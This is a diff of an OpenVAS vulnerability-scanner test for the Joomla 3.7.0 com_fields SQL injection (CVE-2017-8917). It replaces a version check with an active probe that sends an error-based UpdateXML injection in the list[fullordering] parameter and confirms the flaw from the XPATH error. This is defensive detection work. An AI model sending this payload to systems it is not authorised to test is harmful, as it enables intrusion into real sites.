@@ -1,8 +1,8 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_sql_inj_vuln_may17.nasl 6177 2017-05-19 12:59:28Z antu123 $
+# $Id: gb_joomla_sql_inj_vuln_may17.nasl 6262 2017-06-01 11:47:33Z santu $
 #
-# Joomla! Core SQL Injection Vulnerability - May17
+# Joomla! Core 'com_fields' SQL Injection Vulnerability
 #
 # Authors:
 # Shakeel <bshakeel@secpod.com>
@@ -29,13 +29,14 @@ CPE = "cpe:/a:joomla:joomla";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.811044");
-  script_version("$Revision: 6177 $");
+  script_version("$Revision: 6262 $");
   script_cve_id("CVE-2017-8917");
+  script_bugtraq_id(98515);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-19 14:59:28 +0200 (Fri, 19 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-06-01 13:47:33 +0200 (Thu, 01 Jun 2017) $");
   script_tag(name:"creation_date", value:"2017-05-18 10:39:51 +0530 (Thu, 18 May 2017)");
-  script_name("Joomla! Core SQL Injection Vulnerability - May17");
+  script_name("Joomla! Core 'com_fields' SQL Injection Vulnerability");
 
   script_tag(name:"summary", value:"This host is running Joomla and is prone
   to SQL injection vulnerability.");
@@ -58,13 +59,13 @@ if(description)
 
   script_tag(name:"solution_type", value:"VendorFix");
 
-  script_tag(name:"qod_type", value:"remote_banner");
+  script_tag(name:"qod_type", value:"exploit");
 
   script_xref(name : "URL" , value : "https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html");
   script_xref(name : "URL" , value : "https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html");
 
   script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
-  script_category(ACT_GATHER_INFO);
+  script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_dependencies("joomla_detect.nasl");
   script_mandatory_keys("joomla/installed");
@@ -72,28 +73,71 @@ if(description)
   exit(0);
 }
 
-include("version_func.inc");
+
+include("http_func.inc");
 include("host_details.inc");
+include("http_keepalive.inc");
 
-## Variable Initialization
-jPort = "";
-jVer = "";
+# Variable Initialization
+dir = "";
+url = "";
+report = "";
+http_port = 0;
+sndReq = "";
+rcvRes = "";
+cookie = "";
+fieldset = "";
 
-## get the port
-if(!jPort = get_app_port(cpe:CPE)){
+# Get HTTP Port
+if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get the version
-if(!jVer = get_app_version(cpe:CPE, port:jPort)){
+## Get Application Location
+if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-## Check for version
-if (jVer == "3.7.0")
+##Construct Attack Request
+url = dir + "/index.php/component/users/?view=login";
+
+##Send Request and get response
+sndReq = http_get(item:url, port:http_port);
+rcvRes = http_keepalive_send_recv( port:http_port, data:sndReq);
+
+if(rcvRes =~ "HTTP/1\.. 200" && "Set-Cookie:" >< rcvRes)
 {
-  report = report_fixed_ver(installed_version:jVer, fixed_version:"3.7.1");
-  security_message(port:jPort, data:report);
-  exit(0);
+  ##Fetch Cookie and fieldset ID
+  cookie = eregmatch(pattern:"Set-Cookie: ([^;]+)", string:rcvRes);
+  if(!cookie[1]){
+    exit(0);
+  }
+  cookieid = cookie[1];  
+
+ 
+  fieldset = egrep(pattern:'<input.type="hidden".name="([^"]+).*fieldset', string:rcvRes);
+  if(!fieldset){
+    exit(0);
+  }
+
+  fieldsetid = eregmatch(pattern:'".name="([^"]+)', string:fieldset);
+  if(!fieldsetid[1]){
+    exit(0);
+  }
+
+  ##Construct Attack URL
+  url = dir + "/index.php?option=com_fields&view=fields&layout=modal&view=" +
+              "fields&layout=modal&option=com_fields&" + fieldsetid[1] +
+              "=1&list%5Bfullordering%5D=UpdateXML%282%2C+concat%280x3a%2C128%2B127%2C+0x3a%29%2C+1%29";
+
+  ##Send message and check response
+  if(http_vuln_check(port:http_port, url:url, cookie: cookieid,
+                     pattern:"500 Internal Server Error", extra_check:make_list("Home Page<",
+                    "&copy; 2017 (j|J)oomla", "XPATH syntax error:.*&#039;.255.&#039;.*</bl")))
+  {
+    report = report_vuln_url(port:http_port, url:url);
+    security_message(port: http_port, data: report);
+    exit(0);
+  }
 }
 exit(0);
